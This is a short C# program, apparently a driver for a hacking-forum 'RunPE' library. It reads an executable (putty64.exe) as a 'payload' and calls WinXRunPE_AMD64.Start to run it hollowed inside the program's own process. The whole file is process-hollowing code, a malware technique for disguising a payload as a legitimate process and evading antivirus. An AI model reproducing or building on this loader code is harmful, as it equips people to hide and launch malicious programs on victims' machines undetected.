using HackForums.gigajew;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace antis
{
    public static class Program
    {

        public static int Main(string[] args)
        {
            byte[] payload_amd64 = File.ReadAllBytes("putty64.exe");
            string calculator_amd64 = typeof(Program).Assembly.Location;
            string[] arguments = null;
            bool hidden = false;

            WinXParameters parameters = WinXParameters.Create(payload_amd64, calculator_amd64, hidden, arguments);
            WinXRunPE_AMD64.Start(parameters);



            return 0;
        }

    }
}
